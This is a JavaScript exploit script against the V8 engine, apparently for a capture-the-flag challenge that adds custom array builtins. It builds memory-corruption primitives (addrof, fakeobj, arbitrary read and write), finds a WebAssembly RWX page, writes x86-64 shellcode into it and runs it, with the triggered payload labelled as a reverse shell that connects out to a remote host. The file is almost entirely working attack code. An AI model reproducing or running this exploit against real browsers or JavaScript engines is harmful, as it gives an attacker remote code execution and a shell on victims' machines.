let conversion_buffer = new ArrayBuffer(8);
let float_view = new Float64Array(conversion_buffer);
let int_view = new BigUint64Array(conversion_buffer);

BigInt.prototype.hex = function() {
    return '0x' + this.toString(16);
};
BigInt.prototype.i2f = function() {
    int_view[0] = this;
    return float_view[0];
}
BigInt.prototype.smi2f = function() {
    int_view[0] = this << 32n;
    return float_view[0];
}
Number.prototype.f2i = function() {
    float_view[0] = this;
    return int_view[0];
}
Number.prototype.f2smi = function() {
    float_view[0] = this;
    return int_view[0] >> 32n;
}

Number.prototype.fhw = function() {
    float_view[0] = this;
    return int_view[0] >> 32n;
}

Number.prototype.flw = function() {
    float_view[0] = this;
    return int_view[0] & BigInt(2**32-1);
}

Number.prototype.i2f = function() {
    return BigInt(this).i2f();
}
Number.prototype.smi2f = function() {
    return BigInt(this).smi2f();
}

function hex(a) {
    return "0x" + a.toString(16);
}

function toLittle(num, buf) {
	return new DataView(buf).getBigUint64(0, false);
}

/*
b v8::internal::Builtin_Impl_ArrayGetLastElement
b v8::internal::Builtin_Impl_ArraySetLastElement	
# Fatal error in ../../src/objects/fixed-array-inl.h, line 312
# Debug check failed: index >= 0 && index < this->length().

0x1dbbe77cdd58:	0x0000172dc36414f9	0x0000000200000000 <-- FixedDoubleArray
0x1dbbe77cdd68:	0x3ff199999999999a	0x400199999999999a
0x1dbbe77cdd78:	0x000011304a782ed9	0x0000172dc3640c71 <-- JSArray

./v8_full/out/x64.release/d8 test2.js
run test.js --shell --allow-natives-syntax
run test2.js --shell --allow-natives-syntax
gdb ./v8_full/out/x64.release/d8

// FixedArray describes fixed-sized arrays with element type Object.


// FixedDoubleArray describes fixed-sized arrays with element type double.


Map - Properties - Elements


Problem we have: 
- Due to compressed pointers, an array with Objects inside stores the pointers 
to the objects as 32 bit addresses. 
- In SetLastElement the array will be casted to a FixedDoubleArray
- arr[len] will expect elements to be 8 byte from each other instead of 4
- Therefore we can't use addrof approach described here: https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/

- Since we gain an offset of 4 bytes for every extra element in an array with objects however, 
we can use this to simply overwrite the map of an object array after the first one.

=> This is how addrof below works
*/

var temp_obj = {"A": 1}
//offset to obj_arr2 map
var obj_arr = [temp_obj, temp_obj, temp_obj, temp_obj, temp_obj, temp_obj, temp_obj];
var obj_arr2 = [temp_obj];
var arr = [1.1, 1.2, 1.3, 1.4];
//arr is of type FixedDoubleArray so no pointer width problems here.
var arr_map =  arr.GetLastElement();
// use element width confusion to access map of obj2_arr
var obj_arr2_map = obj_arr.GetLastElement();

var obj_arr3 = [temp_obj, temp_obj, temp_obj, temp_obj];
var array_buf = new ArrayBuffer(0x800);
var array_buf_map = obj_arr3.GetLastElement();

var obj_arr4 = [temp_obj, temp_obj, temp_obj, temp_obj, temp_obj, temp_obj];
var array_buf2 = new ArrayBuffer(0x800);
var array_buf_elements = obj_arr4.GetLastElement();

function addrof(in_obj, small=true) {
	obj_arr2[0] = in_obj;

	// change obj_arr2 map to arr_map
	obj_arr.SetLastElement(arr_map);

	// get compressed ptr of in_obj
	var in_obj_addr;
	if (small) {
		in_obj_addr = obj_arr2[0].flw();
	}
	else {
		in_obj_addr = obj_arr2[0].f2i();
	}

	// change back obj_arr2 map to initial state
	obj_arr.SetLastElement(obj_arr2_map); 

	return in_obj_addr;
}

function fakeobj(addr) {
	arr[0] = addr.i2f();

	arr.SetLastElement(obj_arr2_map);

	var fake = arr[0];

	arr.SetLastElement(arr_map);

	return fake;
}

var arb_rw_arr = [arr_map, 1.2, 2.3];
//only for mapped regions of v8 (compressed pointers)
function arb_read(addr) {
	var fake = fakeobj(addrof(arb_rw_arr, false) - 0x18n);
	arb_rw_arr[1] = (addr - 0x8n).i2f();

	return fake[0];
}


var arb_rw_arr2 = [array_buf_map, array_buf_elements, 1.2, 1.2];
// for all other regions (normal 64 bit pointers)
function arb_read2(addr) {
	var fake = fakeobj(addrof(arb_rw_arr2, false) - 0x20n);
	arb_rw_arr2[2] = (addr << 32n).i2f();
	arb_rw_arr2[3] = (addr >> 32n).i2f();

	var fake_view = new BigUint64Array(fake);

	return fake_view[0];
}

function arb_write2(addr, val) {
	var fake = fakeobj(addrof(arb_rw_arr2, false) - 0x20n);
	arb_rw_arr2[2] = (addr << 32n).i2f();
	arb_rw_arr2[3] = (addr >> 32n).i2f();

	var fake_view = new BigUint64Array(fake);

	fake_view[0] = BigInt(val);
}

function arb_write2_arr(addr, arr, little=true) {
	var fake = fakeobj(addrof(arb_rw_arr2, false) - 0x20n);
	arb_rw_arr2[2] = (addr << 32n).i2f();
	arb_rw_arr2[3] = (addr >> 32n).i2f();

	var fake_view = new DataView(fake);

	for (let i = 0; i < arr.length; i++) {
		fake_view.setBigUint64(8*i, arr[i], little);
	}
}


function arb_write(addr, val) {
	let fake = fakeobj(addrof(arb_rw_arr, false) - 0x18n);

	console.log('fake: ', typeof(fake));

	arb_rw_arr[1] = (addr - 0x8n).i2f();

	fake[0] = val.i2f();
}

// https://wasdk.github.io/WasmFiddle/
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;

var wasm_addr = addrof(wasm_instance, false);

rwx_base = arb_read(wasm_addr + 0x68n);
rwx_base = rwx_base.f2i();

ptr_base = arb_read(wasm_addr + 0x5fn);
ptr_base = ptr_base.f2i() / 256n;


console.log("wasm:", hex(wasm_addr));
console.log("Rwx_base: ", hex(rwx_base));
console.log("Ptr base: ", hex(ptr_base));

// https://xz.aliyun.com/t/5003
var shellcode = [
    0x9090909090909090n,
    0x91969dd1bb48c031n,
    0x53dbf748ff978cd0n,
    0xb05e545752995f54n,
    0xcccccccccc050f3bn
];


// https://www.exploit-db.com/exploits/42485
var shellcode2 = [
	0x4831c04883c02948n,
	0x31ff4889fa4883c7n,
	0x024831f64883c601n,
	0x0f054889c74831c0n,
	0x504883c002c74424n,
	0xfc55d6885366c744n,
	0x24fa0bb866894424n,
	0xf84883ec084883c0n,
	0x284889e64831d248n,
	0x83c2100f054831c0n,
	0x4889c64883c0210fn,
	0x054831c04883c021n,
	0x4831f64883c6010fn,
	0x054831c04883c021n,
	0x4831f64883c6020fn,
	0x054831c05048bb2fn,
	0x62696e2f2f736853n,
	0x4889e7504889e257n,
	0x4889e64883c03b0fn,
	0x0590909090909090n
];

// test shell locally:
// arb_write2_arr(rwx_base, shellcode, true);

// reverse shell:
arb_write2_arr(rwx_base, shellcode2, false);

console.log('triggering shell');

f();
